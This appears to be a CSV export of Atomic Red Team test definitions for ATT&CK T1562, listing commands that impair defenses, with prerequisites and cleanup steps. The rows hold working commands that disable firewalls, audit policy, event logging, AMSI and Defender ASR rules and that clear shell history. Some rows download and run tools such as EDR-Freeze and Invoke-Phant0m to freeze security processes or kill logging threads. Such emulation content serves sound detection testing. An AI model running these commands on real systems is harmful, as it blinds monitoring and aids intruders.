"TechniqueID","TestName","Command","PrereqCommand","CleanupCommand","SourceFile"
"T1562.001","ESXi - Disable Account Lockout Policy via PowerCLI","Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false 
Connect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}
Get-AdvancedSetting -Entity #{vm_host} -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false
Disconnect-VIServer -Confirm:$false
","Install-Module -Name VMware.PowerCLI -Confirm:$false
","","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml"
"T1562.001","Delete Microsoft Defender ASR Rules - InTune","$registryPath = ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Policy Manager""

if (-not (Test-Path $registryPath)) {
  New-Item -Path $registryPath -Force
  Write-Host ""Registry key created: $registryPath""
}

$registryValueName = ""ASRRules""

if (Test-Path ""$registryPath\$registryValueName"") {
  Remove-ItemProperty -Path $registryPath -Name $registryValueName
  Write-Host ""Registry value deleted: $registryValueName""
} else {
  New-ItemProperty -Path $registryPath -Name $registryValueName -PropertyType String -Value ""36190899-1602-49e8-8b27-eb1d0a1ce869=1"" -Force
  Write-Host ""Registry value created: $registryValueName""
}


Remove-ItemProperty -Path $registryPath -Name $registryValueName
Write-Host ""Registry value deleted: $registryValueName""","","","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml"
"T1562.001","Delete Microsoft Defender ASR Rules - GPO","$registryPath = ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules""

if (-not (Test-Path $registryPath)) {
    New-Item -Path $registryPath -Force
    Write-Host ""Registry key created: $registryPath""
}

$newValueName = ""36190899-1602-49e8-8b27-eb1d0a1ce869""
$newValueData = ""1""
New-ItemProperty -Path $registryPath -Name $newValueName -PropertyType String -Value $newValueData -Force
Write-Host ""Registry value created: $newValueName with data $newValueData""

Remove-ItemProperty -Path $registryPath -Name $newValueName
Write-Host ""Registry value deleted: $newValueName""","","","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml"
"T1562.001","AMSI Bypass - Create AMSIEnable Reg Key","New-Item -Path ""HKCU:\Software\Microsoft\Windows Script\Settings"" -Force | Out-Null
New-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows Script\Settings"" -Name ""AmsiEnable"" -Value 0 -PropertyType DWORD -Force | Out-Null
","","Remove-Item -Path ""HKCU:\Software\Microsoft\Windows Script\Settings"" -Recurse -Force 2> $null
","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml"
"T1562.001","Disable EventLog-Application Auto Logger Session Via Registry - Cmd","reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application"" /v ""Start"" /t REG_DWORD /d ""0"" /f","","reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application"" /v ""Start"" /t REG_DWORD /d ""1"" /f","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml"
"T1562.001","Disable EventLog-Application Auto Logger Session Via Registry - PowerShell","New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application -Name Start -Value 0 -PropertyType ""DWord"" -Force","","New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application -Name Start -Value 1 -PropertyType ""DWord"" -Force","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml"
"T1562.001","Disable EventLog-Application ETW Provider Via Registry - Cmd","reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\#{ETWProviderGUID}"" /v ""Enabled"" /t REG_DWORD /d ""0"" /f","","reg add ""HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\#{ETWProviderGUID}"" /v ""Enabled"" /t REG_DWORD /d ""1"" /f","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml"
"T1562.001","Disable EventLog-Application ETW Provider Via Registry - PowerShell","New-ItemProperty -Path ""HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\#{ETWProviderGUID}"" -Name Enabled -Value 0 -PropertyType ""DWord"" -Force","","New-ItemProperty -Path ""HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application\#{ETWProviderGUID}"" -Name Enabled -Value 1 -PropertyType ""DWord"" -Force","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml"
"T1562.001","Freeze PPL-protected process with EDR-Freeze","# Enable SeDebugPrivilege
Add-Type -TypeDefinition @""
using System;
using System.Runtime.InteropServices;

public class TokenAdjuster {
    [DllImport(""advapi32.dll"", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport(""advapi32.dll"", SetLastError = true)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);

    [DllImport(""advapi32.dll"", SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
        ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct TOKEN_PRIVILEGES {
        public int PrivilegeCount;
        public long Luid;
        public int Attributes;
    }

    public const int SE_PRIVILEGE_ENABLED = 0x00000002;
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const uint TOKEN_QUERY = 0x0008;

    public static bool EnableSeDebugPrivilege() {
        IntPtr hToken;
        if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
            return false;

        long luid;
        if (!LookupPrivilegeValue(null, ""SeDebugPrivilege"", out luid))
            return false;

        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount = 1;
        tp.Luid = luid;
        tp.Attributes = SE_PRIVILEGE_ENABLED;

        return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    }
}
""@

$result = [TokenAdjuster]::EnableSeDebugPrivilege()
if ($result) {
    Write-Host ""SeDebugPrivilege enabled successfully."" -ForegroundColor Green
} else {
    Write-Host ""Failed to enable SeDebugPrivilege."" -ForegroundColor Red
    exit 1
}

# Get basic process info
$process = Get-Process -Name $#{processName} -ErrorAction Stop
$processName = $process.ProcessName
Write-Host ""Process Name: $processName)""
Write-Host ""PID: $($process.Id)""
        
# Get executable path and user info
$query = ""SELECT * FROM Win32_Process WHERE Name = '$processName.exe'""
$wmiProcess = Get-WmiObject -Query $query

$owner = $wmiProcess.GetOwner()
    Write-Host ""User: $($owner.Domain)\$($owner.User)""


# Get the folder of the current script
$scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition

# Download latest EDR-Freeze package and extract (force replace)
$downloadUrl = ""https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip""
$zipPath = Join-Path $scriptFolder ""EDR-Freeze_1.0.zip""
Write-Host ""Downloading latest EDR-Freeze from $downloadUrl"" -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
    Write-Host ""Download completed: $zipPath"" -ForegroundColor Green
    $extractFolder = $scriptFolder
    if (Test-Path $zipPath) {
        Write-Host ""Extracting archive to $extractFolder (overwriting existing files)"" -ForegroundColor Cyan
        if (Test-Path $extractFolder) {
            # Ensure target exe not locked; attempt to stop any running instance silently
            Get-Process -Name ""EDR-Freeze_1.0"" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        }
        Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null
        # Custom extraction routine (overwrite existing) compatible with .NET Framework (no bool overwrite overload)
        $archive = $null
        try {
            $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
            foreach ($entry in $archive.Entries) {
                if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue }
                if ($entry.FullName.EndsWith('/')) { # directory entry
                    $dirPath = Join-Path $extractFolder $entry.FullName
                    if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null }
                    continue
                }
                $destPath = Join-Path $extractFolder $entry.FullName
                $destDir = Split-Path $destPath -Parent
                if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }
                if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue }
                try {
                    # Use static extension method (PowerShell 5.1 compatible)
                    [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false)
                } catch {
                    Write-Host ""Failed to extract entry $($entry.FullName): $_"" -ForegroundColor Yellow
                }
            }
            Write-Host ""Extraction completed."" -ForegroundColor Green
        } finally {
            if ($archive) { $archive.Dispose() }
        }
    }
} catch {
    Write-Host ""Failed to download or extract EDR-Freeze: $_"" -ForegroundColor Red
}

# Wait 15s before putting targeted process before putting it in the comma
Write-Host ""Waiting 15s before putting $processName in the comma"" -ForegroundColor Yellow
Start-Sleep -Seconds 5
Write-Host ""Waiting 10s before putting $processName in the comma"" -ForegroundColor Yellow
Start-Sleep -Seconds 5
Write-Host ""Waiting 5s before putting $processName in the comma"" -ForegroundColor Yellow
Start-Sleep -Seconds 3
Write-Host ""Waiting 2s before putting $processName in the comma"" -ForegroundColor Yellow
Start-Sleep -Seconds 2

# Put targeted  process in the comma for 15s
# Discover the EDR-Freeze executable dynamically (pick most recent if multiple)
$edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |
    Sort-Object LastWriteTime -Descending |
    Select-Object -First 1 -ExpandProperty Name
if (-not $edrFreezeExeName) {
    Write-Host ""No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder"" -ForegroundColor Red
    exit 1
}

$edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName
Write-Host ""Using EDR-Freeze executable: $edrFreezeExeName"" -ForegroundColor Cyan
Write-Host ""$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)"" -ForegroundColor Yellow
Start-Process -FilePath $edrFreezeExe -ArgumentList (""$($process.Id) 15000"") | Out-Null","","Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue
Write-Output ""File deleted: $edrFreezeExe""","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml"
"T1562.001","Disable ASLR Via sysctl parameters - Linux","sysctl -w kernel.randomize_va_space=0
","","sysctl -w kernel.randomize_va_space=2
","C:\AtomicRedTeam\atomics\T1562.001\T1562.001.yaml"
"T1562.002","Disable Windows IIS HTTP Logging","C:\Windows\System32\inetsrv\appcmd.exe set config ""#{website_name}"" /section:httplogging /dontLog:true
","","if(Test-Path ""C:\Windows\System32\inetsrv\appcmd.exe""){
  C:\Windows\System32\inetsrv\appcmd.exe set config ""#{website_name}"" /section:httplogging /dontLog:false *>$null
}
","C:\AtomicRedTeam\atomics\T1562.002\T1562.002.yaml"
"T1562.002","Disable Windows IIS HTTP Logging via PowerShell","set-WebConfigurationProperty -PSPath ""IIS:\Sites\#{website_name}\"" -filter ""system.webServer/httpLogging"" -name dontLog -value $true
","","if(Test-Path ""C:\Windows\System32\inetsrv\appcmd.exe""){
  C:\Windows\System32\inetsrv\appcmd.exe set config ""#{website_name}"" /section:httplogging /dontLog:false *>$null
}
","C:\AtomicRedTeam\atomics\T1562.002\T1562.002.yaml"
"T1562.002","Kill Event Log Service Threads","Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
$url = ""https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1""
$output = ""$env:TEMP\Invoke-Phant0m.ps1""
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)
cd $env:TEMP
Import-Module .\Invoke-Phant0m.ps1
Invoke-Phant0m
","","Write-Host ""NEED TO Restart-Computer TO ENSURE LOGGING RETURNS"" -fore red
Remove-Item ""$env:TEMP\Invoke-Phant0m.ps1"" -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1562.002\T1562.002.yaml"
"T1562.002","Impair Windows Audit Log Policy","auditpol /set /category:""Account Logon"" /success:disable /failure:disable
auditpol /set /category:""Logon/Logoff"" /success:disable /failure:disable
auditpol /set /category:""Detailed Tracking"" /success:disable
","","auditpol /set /category:""Account Logon"" /success:enable /failure:enable
auditpol /set /category:""Detailed Tracking"" /success:enable
auditpol /set /category:""Logon/Logoff"" /success:enable /failure:enable
","C:\AtomicRedTeam\atomics\T1562.002\T1562.002.yaml"
"T1562.002","Clear Windows Audit Policy Config","auditpol /clear /y
auditpol /remove /allusers
","","auditpol /set /category:""Account Logon"" /success:enable /failure:enable
auditpol /set /category:""Detailed Tracking"" /success:enable
auditpol /set /category:""Logon/Logoff"" /success:enable /failure:enable
","C:\AtomicRedTeam\atomics\T1562.002\T1562.002.yaml"
"T1562.002","Disable Event Logging with wevtutil","wevtutil sl ""#{log_name}"" /e:false
","","wevtutil sl ""#{log_name}"" /e:true
","C:\AtomicRedTeam\atomics\T1562.002\T1562.002.yaml"
"T1562.002","Makes Eventlog blind with Phant0m","""#{file_name}""
","New-Item -Type Directory (split-path ""#{file_name}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1562.002/bin/Phant0m.exe"" -OutFile ""#{file_name}"" -UseBasicParsing
","echo ""Sorry you have to reboot""
","C:\AtomicRedTeam\atomics\T1562.002\T1562.002.yaml"
"T1562.002","Modify Event Log Channel Access Permissions via Registry - PowerShell","Set-ItemProperty -Path #{ChannelPath} -Name ""ChannelAccess"" -Value ""O:SYG:SYD:(D;;0x1;;;WD)""
Restart-Service -Name EventLog -Force -ErrorAction Ignore ","","Set-ItemProperty -Path #{ChannelPath} -Name ""ChannelAccess"" -Value ""O:BAG:SYD:(A;;0x2;;;S-1-15-2-1)(A;;0x2;;;S-1-15-3-1024-3153509613-960666767-3724611135-2725662640-12138253-543910227-1950414635-4190290187)(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x7;;;SO)(A;;0x3;;;IU)(A;;0x3;;;SU)(A;;0x3;;;S-1-5-3)(A;;0x3;;;S-1-5-33)(A;;0x1;;;S-1-5-32-573)""
Restart-Service -Name EventLog -Force -ErrorAction Ignore","C:\AtomicRedTeam\atomics\T1562.002\T1562.002.yaml"
"T1562.002","Modify Event Log Channel Access Permissions via Registry 2 - PowerShell","New-Item -Path #{ChannelPath} -Force
Set-ItemProperty -Path #{ChannelPath} -Name ""ChannelAccess"" -Value ""O:SYG:SYD:(D;;0x1;;;WD)""
Restart-Service -Name EventLog -Force -ErrorAction Ignore","","Remove-Item -Path #{ChannelPath} -Force
Restart-Service -Name EventLog -Force -ErrorAction Ignore","C:\AtomicRedTeam\atomics\T1562.002\T1562.002.yaml"
"T1562.002","Modify Event Log Access Permissions via Registry - PowerShell","Set-ItemProperty -Path #{CustomSDPath} -Name ""CustomSD"" -Value ""O:SYG:SYD:(D;;0x1;;;WD)""","","Remove-ItemProperty -Path #{CustomSDPath} -Name ""CustomSD""","C:\AtomicRedTeam\atomics\T1562.002\T1562.002.yaml"
"T1562.003","Disable history collection","export HISTCONTROL=ignoreboth
#{evil_command}
","","","C:\AtomicRedTeam\atomics\T1562.003\T1562.003.yaml"
"T1562.003","Disable history collection (freebsd)","export HISTSIZE=0
#{evil_command}
","","","C:\AtomicRedTeam\atomics\T1562.003\T1562.003.yaml"
"T1562.003","Mac HISTCONTROL","","","","C:\AtomicRedTeam\atomics\T1562.003\T1562.003.yaml"
"T1562.003","Clear bash history","cp $HISTFILE $HISTFILE.OLD
if ((${#HISTFILE[@]})); then echo $HISTFILE; fi
echo """" > $HISTFILE
if [ $(wc -c <$HISTFILE) -gt 1 ]; then echo ""$HISTFILE is larger than 1k""; fi
ls -la $HISTFILE 
cat $HISTFILE
history -c 
if [ $(history |wc -l) -eq 1 ]; then echo ""History cache cleared""; fi
","","mv -f $HISTFILE.OLD $HISTFILE 
","C:\AtomicRedTeam\atomics\T1562.003\T1562.003.yaml"
"T1562.003","Setting the HISTCONTROL environment variable","TEST=$(echo $HISTCONTROL)
if [ ""$HISTCONTROL"" != ""ignoreboth"" ]; then export HISTCONTROL=""ignoreboth""; fi
history -c 
ls -la $HISTFILE # "" ls -la $HISTFILE""
if [ $(history |wc -l) -eq 1 ]; then echo ""ls -la is not in history cache""; fi
if [ ""$HISTCONTROL"" != ""erasedups"" ]; then export HISTCONTROL=""erasedups""; fi
history -c 
ls -la $HISTFILE
ls -la $HISTFILE
ls -la $HISTFILE
if [ $(history |wc -l) -eq 2 ]; then echo ""Their is only one entry for ls -la $HISTFILE""; fi
","","export HISTCONTROL=$(echo $TEST)
","C:\AtomicRedTeam\atomics\T1562.003\T1562.003.yaml"
"T1562.003","Setting the HISTFILESIZE environment variable","TEST=$(echo $HISTFILESIZE)
echo $HISTFILESIZE
export HISTFILESIZE=0
echo ""runnning some commands to populate the history""
whoami
groups
if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo ""\$HISTFILESIZE is zero""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT"";  fi
","","export HISTCONTROL=$(echo $TEST)
","C:\AtomicRedTeam\atomics\T1562.003\T1562.003.yaml"
"T1562.003","Setting the HISTSIZE environment variable","echo $HISTSIZE
export HISTSIZE=0
echo ""runnning some commands to populate the history""
whoami
groups
if [ $(echo $HISTSIZE) -eq 0 ]; then echo ""\$HISTSIZE is zero""; else HIST_LENGTH=$(wc -l $HISTFILE); echo ""\$HISTSIZE is not zero, history size is $HIST_LENGTH"";  fi
","","export HISTSIZE=100
","C:\AtomicRedTeam\atomics\T1562.003\T1562.003.yaml"
"T1562.003","Setting the HISTFILE environment variable","TEST=$(echo $HISTFILE)
echo $HISTFILE
export HISTFILE=""/dev/null""
echo ""runnning some commands to populate the history""
whoami
groups
if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""\$HISTFILE is not /dev/null, history lenght is $HIST_LENGHT"";  fi
","","export HISTFILE=$(echo $TEST)
","C:\AtomicRedTeam\atomics\T1562.003\T1562.003.yaml"
"T1562.003","Setting the HISTFILE environment variable (freebsd)","echo $HISTFILE
export HISTFILE=""/dev/null""
if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; fi
","","export HISTFILE=~/.sh_history
","C:\AtomicRedTeam\atomics\T1562.003\T1562.003.yaml"
"T1562.003","Setting the HISTIGNORE environment variable","if ((${#HISTIGNORE[@]})); then echo ""\$HISTIGNORE = $HISTIGNORE""; else export HISTIGNORE='ls*:rm*:ssh*'; echo ""\$HISTIGNORE = $HISTIGNORE""; fi
history -c 
ls -la $HISTFILE
ls -la ~/.bash_logout
if [ $(history |wc -l) -eq 1 ]; then echo ""ls commands are not in history""; fi
unset HISTIGNORE
if ((${#HISTIGNORE[@]})); then echo ""\$HISTIGNORE = $HISTIGNORE""; else export HISTIGNORE='*'; echo ""\$HISTIGNORE = $HISTIGNORE""; fi
history -c 
whoami
groups
if [ $(history |wc -l) -eq 0 ]; then echo ""History cache is empty""; fi
","","unset HISTIGNORE
","C:\AtomicRedTeam\atomics\T1562.003\T1562.003.yaml"
"T1562.003","Disable Windows Command Line Auditing using reg.exe","reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f
","","reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
","C:\AtomicRedTeam\atomics\T1562.003\T1562.003.yaml"
"T1562.003","Disable Windows Command Line Auditing using Powershell Cmdlet","New-ItemProperty -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit"" -Name ""ProcessCreationIncludeCmdLine_Enabled"" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore
","","New-ItemProperty -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit"" -Name ""ProcessCreationIncludeCmdLine_Enabled"" -Value 1 -PropertyType DWORD -Force -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1562.003\T1562.003.yaml"
"T1562.004","Disable Microsoft Defender Firewall","netsh advfirewall set currentprofile state off
","","netsh advfirewall set currentprofile state on >nul 2>&1
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Disable Microsoft Defender Firewall via Registry","reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile"" /v ""EnableFirewall"" /t REG_DWORD /d 0 /f
","","reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile"" /v ""EnableFirewall"" /t REG_DWORD /d 1 /f
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Allow SMB and RDP on Microsoft Defender Firewall","netsh advfirewall firewall set rule group=""remote desktop"" new enable=Yes
netsh advfirewall firewall set rule group=""file and printer sharing"" new enable=Yes
","","netsh advfirewall reset >nul 2>&1
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Opening ports for proxy - HARDRAIN","netsh advfirewall firewall add rule name=""atomic testing"" action=allow dir=in protocol=TCP localport=450 
","","netsh advfirewall firewall delete rule name=""atomic testing"" protocol=TCP localport=450 >nul 2>&1","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Open a local port through Windows Firewall to any profile","netsh advfirewall firewall add rule name=""Open Port to Any"" dir=in protocol=tcp localport=#{local_port} action=allow profile=any","","netsh advfirewall firewall delete rule name=""Open Port to Any"" | Out-Null","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Allow Executable Through Firewall Located in Non-Standard Location","Copy-Item ""#{exe_file_path}"" -Destination ""C:\Users\$env:UserName"" -Force
netsh advfirewall firewall add rule name=""Atomic Test"" dir=in action=allow program=""C:\Users\$env:UserName\AtomicTest.exe"" enable=yes
","","netsh advfirewall firewall delete rule name=""Atomic Test"" | Out-Null
Remove-Item C:\Users\$env:UserName\AtomicTest.exe -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Stop/Start UFW firewall","ufw disable
","echo """"
","ufw enable
ufw status verbose
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Stop/Start Packet Filter","service pf stop
service pf disable
","echo """"
","service pf enable
service pf start
service pf status
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Stop/Start UFW firewall systemctl","systemctl stop ufw
","echo """"
","systemctl start ufw
systemctl status ufw
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Turn off UFW logging","ufw logging off
","echo """"
","ufw logging low
ufw status verbose
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Add and delete UFW firewall rules","ufw prepend deny from 1.2.3.4
ufw status numbered
","echo """"
","{ echo y; echo response; } | ufw delete 1
ufw status numbered
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Add and delete Packet Filter rules","echo ""block in proto tcp from 1.2.3.4 to any"" | pfctl -a pf-rules -f -
pfctl -a pf-rules -s rules
","echo ""anchor pf-rules >> /etc/pf.conf""
pfctl -f /etc/pf.conf
","pfctl -a pf-rules -F rules
sed -i """" '/anchor pf-rules/d'
pfctl -f /etc/pf.conf
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Edit UFW firewall user.rules file","echo ""# THIS IS A COMMENT"" >> /etc/ufw/user.rules
grep ""# THIS IS A COMMENT"" /etc/ufw/user.rules
","echo """"
","sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/user.rules
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Edit UFW firewall ufw.conf file","echo ""# THIS IS A COMMENT"" >> /etc/ufw/ufw.conf
grep ""# THIS IS A COMMENT"" /etc/ufw/ufw.conf
","echo """"
","sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/ufw.conf
cat /etc/ufw/ufw.conf
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Edit UFW firewall sysctl.conf file","echo ""# THIS IS A COMMENT"" >> /etc/ufw/sysctl.conf
grep ""# THIS IS A COMMENT"" /etc/ufw/sysctl.conf
","echo """"
","sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/sysctl.conf
cat /etc/ufw/sysctl.conf
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Edit UFW firewall main configuration file","echo ""# THIS IS A COMMENT"" >> /etc/default/ufw
grep ""# THIS IS A COMMENT"" /etc/default/ufw
","echo """"
","sed -i 's/# THIS IS A COMMENT//g' /etc/default/ufw
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Tail the UFW firewall log file","tail /var/log/ufw.log
","echo """"
","","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Disable iptables","iptables-save > /tmp/iptables.rules
iptables -F
","sudo apt-get install iptables
","iptables-restore < /tmp/iptables.rules
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","Modify/delete iptables firewall rules","iptables -D OUTPUT -p tcp --dport 21 -j DROP
","iptables-save > /tmp/iptables.rules
if echo ""$(iptables -L)"" | grep -q ""DROP .*dpt:ftp""; then echo ""Rule found""; else echo ""Rule not found. Setting it...""; iptables -A OUTPUT -p tcp --dport 21 -j DROP; fi
","iptables-restore < /tmp/iptables.rules
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","LockBit Black - Unusual Windows firewall registry modification -cmd","reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f
reg add ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" /v EnableFirewall /t REG_DWORD /d 0 /f
","","reg delete ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"" /v EnableFirewall /f >nul 2>&1
reg delete ""HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" /v EnableFirewall /f >nul 2>&1
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
"T1562.004","LockBit Black - Unusual Windows firewall registry modification -Powershell","New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force
","","Remove-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile""  -Name EnableFirewall -Force -ErrorAction Ignore
Remove-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" -Name EnableFirewall -Force -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1562.004\T1562.004.yaml"
